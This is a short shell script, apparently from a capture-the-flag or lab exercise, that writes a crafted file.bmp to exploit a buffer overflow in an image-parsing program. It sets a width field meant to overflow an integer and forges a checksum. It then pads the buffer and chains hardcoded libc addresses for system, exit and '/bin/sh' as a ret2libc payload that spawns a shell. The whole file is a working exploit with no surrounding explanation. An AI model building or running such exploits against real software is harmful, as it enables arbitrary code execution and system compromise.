#!/bin/sh


buffer=$(printf '\x41%.0s' {1..1016}) #fill the buffer
ret_system="\x10\xcd\xe2\xf7"       #addr to system in libc
exit="\x70\xff\xe1\xf7"             #addr to exit
binsh="\xcf\xb8\xf6\xf7"            #addr to binsh

checksum="\xd1\xc1\xda\xd5"         #checksum which will compared

b_WIDTH="\x94\x01\x00\x80"  #WIDTH = 2**(31) + 404
b_LENGTH="\x01\x00\x00\x00" #LENGTH = 1

echo -en "$b_LENGTH$b_WIDTH$checksum$buffer$ret_system$exit$binsh" > file.bmp
